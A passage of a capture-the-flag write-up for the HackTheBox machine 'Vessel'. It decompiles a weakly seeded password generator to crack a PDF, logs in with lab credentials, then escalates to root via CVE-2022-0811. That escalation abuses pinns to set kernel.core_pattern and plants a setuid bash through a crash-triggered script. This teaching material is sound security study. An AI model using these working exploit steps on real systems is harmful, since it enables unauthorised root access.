I’ll note that the Python version of the exe is 3.7. To get a full picture, I’ll re-run it with Pyhton3.7:

```

oxdf@hacky$ python3.7 /opt/pyinstxtractor/pyinstxtractor.py passwordGenerator
[+] Processing passwordGenerator
[+] Pyinstaller version: 2.1+
[+] Python version: 3.7
[+] Length of package: 34300131 bytes
[+] Found 95 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_subprocess.pyc
[+] Possible entry point: pyi_rth_pkgutil.pyc
[+] Possible entry point: pyi_rth_inspect.pyc
[+] Possible entry point: pyi_rth_pyside2.pyc
[+] Possible entry point: passwordGenerator.pyc
[+] Found 142 files in PYZ archive
[+] Successfully extracted pyinstaller archive: passwordGenerator

You can now use a python decompiler on the pyc files within the extracted directory  

```

This generates a bunch of DLLs and compiled Python byte code:

```

oxdf@hacky$ ls passwordGenerator_extracted/
base_library.zip    _lzma.pyd                pyimod03_importers.pyc  python3.dll           Qt5QmlModels.dll        _socket.pyd
_bz2.pyd            MSVCP140_1.dll           pyimod04_ctypes.pyc     PYZ-00.pyz            Qt5Quick.dll            _ssl.pyd
_ctypes.pyd         MSVCP140.dll             pyi_rth_inspect.pyc     PYZ-00.pyz_extracted  Qt5Svg.dll              struct.pyc
d3dcompiler_47.dll  opengl32sw.dll           pyi_rth_pkgutil.pyc     Qt5Core.dll           Qt5VirtualKeyboard.dll  unicodedata.pyd
_hashlib.pyd        passwordGenerator.pyc    pyi_rth_pyside2.pyc     Qt5DBus.dll           Qt5WebSockets.dll       VCRUNTIME140.dll
libcrypto-1_1.dll   pyexpat.pyd              pyi_rth_subprocess.pyc  Qt5Gui.dll            Qt5Widgets.dll
libEGL.dll          pyiboot01_bootstrap.pyc  PySide2                 Qt5Network.dll        select.pyd
libGLESv2.dll       pyimod01_os_path.pyc     pyside2.abi3.dll        Qt5Pdf.dll            shiboken2
libssl-1_1.dll      pyimod02_archive.pyc     python37.dll            Qt5Qml.dll            shiboken2.abi3.dll

```

`passwordGenerator.pyc` is the main program.

I’ll use `uncomplye6` to get back the Python source. I want to run it with the same version as the original, so I’ll create a virtual environment, activate it, and install `uncompyle6`:

```

oxdf@hacky$ python3.7 -m venv venv
oxdf@hacky$ source venv/bin/activate
(venv) oxdf@hacky$ pip install --upgrade pip uncompyle6
Requirement already satisfied: pip in ./venv/lib/python3.7/site-packages (22.0.4)
Collecting pip
  Using cached pip-23.0.1-py3-none-any.whl (2.1 MB)
Collecting uncompyle6
  Using cached uncompyle6-3.9.0-py37-none-any.whl (381 kB)
...[snip]...
Successfully installed click-8.1.3 importlib-metadata-6.1.0 pip-23.0.1 six-1.16.0 spark-parser-1.8.9 typing-extensions-4.5.0 uncompyle6-3.9.0 xdis-6.0.5 zipp-3.15.0

```

Running from the virtual env, I’ll dump the source:

```

(venv) oxdf@hacky$ uncompyle6 passwordGenerator_extracted/passwordGenerator.pyc > passwordGenerator.py

```

#### Source Analysis

The application is using the [PySide](https://www.pythonguis.com/pyside6/) framework to create Python GUI programs:

```

from PySide2.QtCore import *
from PySide2.QtGui import *
from PySide2.QtWidgets import *
from PySide2 import QtWidgets
import pyperclip

```

There’s a bunch of stuff setting up the window, but the interesting function is `genPassword`:

```

    def genPassword(self):
        length = value
        char = index
        if char == 0:
            charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&*()_-+={}[]|:;<>,.?'
        else:
            if char == 1:
                charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
            else:
                if char == 2:
                    charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'
                else:
                    try:
                        qsrand(QTime.currentTime().msec())
                        password = ''
                        for i in range(length):
                            idx = qrand() % len(charset)
                            nchar = charset[idx]
                            password += str(nchar)

                    except:
                        msg = QMessageBox()
                        msg.setWindowTitle('Error')
                        msg.setText('Error while generating password!, Send a message to the Author!')
                        x = msg.exec_()

                return password

```

### Crack Password

#### Attack - Fail

The issue with the code above is that it it is seeding the pseudo-random number generator with a timestamp calling `.msec()`. [This function](https://doc.qt.io/qt-6/qtime.html#msec) returns a number between 0 and 999, representing the millisecond part of the time. This means there are only 1000 possible seeds for the pseudo-random number generator and thus only 1000 possible passwords. The image also shows a password of length 32, and that all possible characters are involved (`char == 0` above).

Knowing that, I can write a simple Python script to generate all 1000 passwords:

```

from PySide2.QtCore import qsrand, qrand

def genPassword(ms: int) -> str:
    length = 32
    charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&*()_-+={}[]|:;<>,.?'

    qsrand(ms)
    password = ''
    for i in range(length):
        idx = qrand() % len(charset)
        nchar = charset[idx]
        password += str(nchar)
    return password

passwords = [genPassword(i) for i in range(1000)]
with open('generated.txt', 'w') as f:
    f.write('\n'.join(passwords))

```

When I run this, I get a file of passwords. I’ll try passing this wordlist to `pdfcrack` (`apt install pdfcrack`), but it fails to find a password:

```

(venv) oxdf@hacky$ pdfcrack -f notes.pdf -w generated.txt 
PDF version 1.6
Security Handler: Standard
V: 2
R: 3
P: -1028
Length: 128
Encrypted Metadata: True
FileID: c19b3bb1183870f00d63a766a1f80e68
U: 4d57d29e7e0c562c9c6fa56491c4131900000000000000000000000000000000
O: cf30caf66ccc3eabfaf371623215bb8f004d7b8581d68691ca7b800345bc9a86
Could not find password

```

#### Success From Windows

It turns out that the libraries used by Python for QT are different on Linux than they are on Windows, so running this on a Windows machine generates a different list of passwords. If I generate the passwords there, and then try `pdfcrack`, it finds the password:

```

(venv) oxdf@hacky$ pdfcrack -f notes.pdf -w generated.txt 
PDF version 1.6
Security Handler: Standard
V: 2
R: 3
P: -1028
Length: 128
Encrypted Metadata: True
FileID: c19b3bb1183870f00d63a766a1f80e68
U: 4d57d29e7e0c562c9c6fa56491c4131900000000000000000000000000000000
O: cf30caf66ccc3eabfaf371623215bb8f004d7b8581d68691ca7b800345bc9a86
found user-password: 'YG7Q7RDzA+q&ke~MJ8!yRzoI^VQxSqSS'

```

### su / SSH

Opening the PDF with that password gives a short note from ethan to steven:

![image-20230321133250770](https://0xdfimages.gitlab.io/img/image-20230321133250770.png)

Using that password with `su` provides a shell as ethan:

```

www-data@vessel:/home/steven$ su - ethan                                
Password: 
ethan@vessel:~$

```

And the user flag:

```

ethan@vessel:~$ cat user.txt
f0402f4f************************

```

This password also works for SSH:

```

oxdf@hacky$ sshpass -p 'b@mPRNSVTjjLKId1T' ssh ethan@vessel.htb
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-124-generic x86_64)
...[snip]...
ethan@vessel:~$

```

## Shell as root

### Enumeration

There’s very little to find on this box as ethan that I haven’t already messed with. ethan isn’t in an especial groups. I’ll look for files owned by the user or group ethan, as those are things I couldn’t access as www-data:

```

ethan@vessel:~$ find / -user ethan 2>/dev/null | grep -Ev '^/(run|sys|proc|home)'
/tmp/tmux-1000
/dev/pts/2
/dev/pts/0
ethan@vessel:~$ find / -group ethan 2>/dev/null | grep -Ev '^/(run|sys|proc|home)'
/usr/bin/pinns
/tmp/tmux-1000

```

`/tmp/tmux-1000` could be interesting, but it’s just an empty directory.

`/usr/bin/pinns` is interesting:

```

ethan@vessel:~$ ls -l /usr/bin/pinns 
-rwsr-x--- 1 root ethan 814936 Mar 15  2022 /usr/bin/pinns

```

It is owned by root, and the ethan group can run it. It’s also SetUID, so it runs as root.

### CVE-2022-0811

#### Identify

I spent a while trying to figure out what this `pinns` binary is. Running it returns an error:

```

ethan@vessel:~$ pinns
[pinns:e]: Path for pinning namespaces not specified: Invalid argument

```

Goolging for this error message didn’t get me anywhere. I also searched for the hash in [VirusTotal](https://www.virustotal.com/gui/file/6405fc112e697c27605144382aec325ebc96d3952bebc9d67797a2bface3a0b0/detection):

![image-20230321141621526](https://0xdfimages.gitlab.io/img/image-20230321141621526.png)

It was first uploaded 3 hours and 42 minutes after Vessel was released, and 19 minutes after the user blood was claimed. This suggests that this binary is unique to Vessel, either a custom binary, or something that’s compiled at install.

Googling for “pinns binary linux” returns a Rust-based tool on GitHub (red box), but looking at the command line args in the readme, it’s not the same thing:

![image-20230321141944539](https://0xdfimages.gitlab.io/img/image-20230321141944539.png)

The other interesting link (in the green box) is a reference to CVE-2022-0811, which the preview text mentions the “pinns binary”.

The [article from sysdig](https://sysdig.com/blog/cve-2022-0811-cri-o/) says that CVE-2022-0811 affects CRI-O version 1.19+. Vessel has `crio`, and it’s version 1.19.6:

```

ethan@vessel:~$ crio --version
crio version 1.19.6
Version:       1.19.6
GitCommit:     c12bb210e9888cf6160134c7e636ee952c45c05a
GitTreeState:  clean
BuildDate:     2022-03-15T18:18:24Z
GoVersion:     go1.15.2
Compiler:      gc
Platform:      linux/amd64
Linkmode:      dynamic

```

[This advisory](https://support.huaweicloud.com/eu/bulletin-cce/topic_0000001265991633.html) say that the scope includes 1.19.6:

> #### Impact Scope
>
> \1. Kubernetes clusters that use CRI-O v1.19 or later, including patch versions 1.19.6, 1.20.7, 1.21.6, 1.22.3, 1.23.2, and 1.24.0.
>
> CCE clusters are not affected by this vulnerability because they do not use CRI-O.

#### Background

CVE-2022-0811 is a vulnerability first discovered researchers at CrowdStrike, and written up in [this [post](https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/). It is a vulnerability in the CRI-O container engine, an open source container engine which can replace Docker in Kubernetes implementation such as OpenShift. The article from sysdig says:

> The CRI-O container engine provides a stable and performant platform for running Open Container Initiative (OCI) compatible runtimes to launch containers and pods by engaging OCI-compliant runtimes like runc.

In CRI-O, `pinns` is used to set kernel options. In version 1.19, they added additional `sysctl` support, and allowed for `pinns` to set any kernel parameters it’s password without validation. While this typically will come up in the context of Kubernetes and pods, the CrowdStrike article explicitly states at the end:

> Kubernetes is not necessary to invoke CVE-2022-8011. An attacker on a machine with CRI-O installed can use it to set kernel parameters all by itself. We used Kubernetes in this POC to better illustrate the potential impact of the problem and to more closely simulate how this would likely be used in the wild.

The issue is in how `pinns` processes multiple options in one parameter, like this:

```

pinns -s kernel_parameter1=value1+kernel_parameter2=value2

```

The `+` is used to split the multiple keys, but only the first key (`kernel_parameter1` in the above example) is checked to make sure it’s a safe kernel option, and `kernel_parameter2` can be any kernel parameter.

#### Modify Kernel Options [Failure]

The goal is to change kernel options such that I get code execution. There’s a long list of kernel options [here](https://docs.kernel.org/admin-guide/sysctl/). In the CrowdStrike blog, they set `kernel.shm_rmid_forced=1` and `kernel.core_pattern=|[script] #`. They have to worry about running a script in a container from the host. Given I’m not navigating containers, my path can be much shorter. Setting the value to start with a `|` is described in the [docs](https://docs.kernel.org/admin-guide/sysctl/kernel.html#core-pattern):

> If the first character of the pattern is a ‘|’, the kernel will treat the rest of the pattern as a command to run. The core dump will be written to the standard input of that program instead of to a file.

The goal is to then start a process and then make it crash, having set the kernel option to have my script called with the result.

I’ll take a look at the current values of the two parameters I want to modify:

```

ethan@vessel:/dev/shm$ cat /proc/sys/kernel/shm_rmid_forced 
0
ethan@vessel:/dev/shm$ cat /proc/sys/kernel/core_pattern 
|/usr/share/apport/apport %p %s %c %d %P %E

```

It’s worth noting that there’s a cleanup script resetting these to the above values every four minutes.

I’ll try to change these with `pinns`, but it doesn’t work:

```

ethan@vessel:/dev/shm$ pinns -s 'kernel.shm_rmid_forced=1'+'kernel.core_pattern=|/tmp/exp.sh #'
[pinns:e]: Path for pinning namespaces not specified: Invalid argument
ethan@vessel:/dev/shm$ cat /proc/sys/kernel/core_pattern 
|/usr/share/apport/apport %p %s %c %d %P %E
ethan@vessel:/dev/shm$ cat /proc/sys/kernel/shm_rmid_forced 
0

```

#### pinns.c Analysis

The source for `pinns` is fairly short (192 lines) and available on [GitHub](https://github.com/cri-o/cri-o/blob/v1.19.1/pinns/src/pinns.c). Towards the [top](https://github.com/cri-o/cri-o/blob/v1.19.1/pinns/src/pinns.c#L34-L44), it defines the options:

```

  static const struct option long_options[] = {
      {"help", no_argument, NULL, 'h'},
      {"uts", optional_argument, NULL, 'u'},
      {"ipc", optional_argument, NULL, 'i'},
      {"net", optional_argument, NULL, 'n'},
      {"user", optional_argument, NULL, 'U'},
      {"cgroup", optional_argument, NULL, 'c'},
      {"dir", required_argument, NULL, 'd'},
      {"filename", required_argument, NULL, 'f'},
      {"sysctl", optional_argument, NULL, 's'},
  };

```

It’s tempting to try running with `-h` or `--help`, but nothing happens.

Then, [lines 46-91](https://github.com/cri-o/cri-o/blob/v1.19.1/pinns/src/pinns.c#L46-L91) parse the options, and set variables based on the input. There’s also a commented out call to `usage()` (a function that doesn’t exist) when it gets to the `-h` case (which explains where there’s no help message).

Now [there’s a bunch](https://github.com/cri-o/cri-o/blob/v1.19.1/pinns/src/pinns.c#L93-L111) of `if` checks that if matched, exit with an error message:

```

  if (!pin_path) {
    pexit("Path for pinning namespaces not specified");
  }

  if (!filename) {
    pexit("Filename for pinning namespaces not specified");
  }

  if (directory_exists_or_create(pin_path) < 0) {
    nexitf("%s exists but is not a directory", pin_path);
  }

  if (num_unshares == 0) {
    nexit("No namespace specified for pinning");
  }

  if (unshare(unshare_flags) < 0) {
    pexit("Failed to unshare namespaces");
  }

```

The first one is the message I’m getting when I try to run. It looks like `-d`, `-f`, and one of `-u`, `-i`, `-n`, `-U`, and `-c` must be set.

Then comes the important part for me - on [lines 113-115](https://github.com/cri-o/cri-o/blob/v1.19.1/pinns/src/pinns.c#L113-L115) it calls `configure_sysctls(sysctls)`:

```

  if (sysctls && configure_sysctls(sysctls) < 0) {
    pexit("Failed to configure sysctls after unshare");
  }

```

What happens after that isn’t super important to me, as I’ve already configured the kernel options.

#### Modify Kernel Options

I’ll run `pinns` again, this time with some extra arguments, sort of guessing at things that might work. For example, the directory in `-d` has to exist or be creatable. This works:

```

ethan@vessel:/dev/shm$ pinns -s 'kernel.shm_rmid_forced=1'+'kernel.core_pattern=|/dev/shm/exp.sh #' -f file -d /dev/shm -U
[pinns:e]: Failed to bind mount ns: /proc/self/ns/user: Operation not permitted
ethan@vessel:/dev/shm$ cat /proc/sys/kernel/core_pattern /proc/sys/kernel/shm_rmid_forced 
|/def/shm/exp.sh #
1

```

It does fail and print and error message, but the kernel options are set. There’s also a `userns` directory in `/dev/shm` (my `-d`) with a single file, `file` (my `-f`) owned by root:ethan:

```

ethan@vessel:/dev/shm$ find userns/ -ls
        6      0 drwxr-xr-x   2 root     ethan          60 Mar 21 22:56 userns/
        7      0 ----------   1 root     ethan           0 Mar 21 22:56 userns/file

```

#### Crash –> Execution

I’ll write a simple script to `/dev/shm/exp.sh` and make it executable:

```

ethan@vessel:/dev/shm$ echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4755 /tmp/0xdf' | tee /dev/shm/exp.sh
#!/bin/bash

cp /bin/bash /tmp/0xdf
chown root:root /tmp/0xdf
chmod 4755 /tmp/0xdf
ethan@vessel:/dev/shm$ chmod +x /dev/shm/exp.sh

```

This will make a copy of `bash` and set it SetUID. `/proc/sys/kernel/core_pattern` already points to this script (I’ll verify again before triggering). I’ll start a sleep process in the background:

```

ethan@vessel:/dev/shm$ sleep 100&
[1] 202713

```

Now I’ll use `killall` to crash it:

```

ethan@vessel:/dev/shm$ killall -s SIGSEGV sleep
[1]+  Segmentation fault      (core dumped) sleep 100

```

There’s now a SetUID Bash binary in `/tmp`:

```

ethan@vessel:/dev/shm$ ls -l /tmp/0xdf 
-rwsr-xr-x 1 root root 1183448 Mar 21 23:00 /tmp/0xdf

```

I’ll run that (with `-p` to not drop privs) to get a shell with an effective UID of root:

```

ethan@vessel:/dev/shm$ /tmp/0xdf -p
0xdf-5.0# id
uid=1000(ethan) gid=1000(ethan) euid=0(root) groups=1000(ethan)

```

And get the root flag:

```

0xdf-5.0# cat root.txt
efeb1ed9************************

```

## Beyond root

I wanted to look a bit more at the Express / mysqljs vulnerability, more than is required to solve the box. In [this video](https://www.youtube.com/watch?v=h5itUtkr0_M), we’ll look at a 2014 GitHub issue, the docs for the package, explore the vulenrability, and fix the vulnerable code.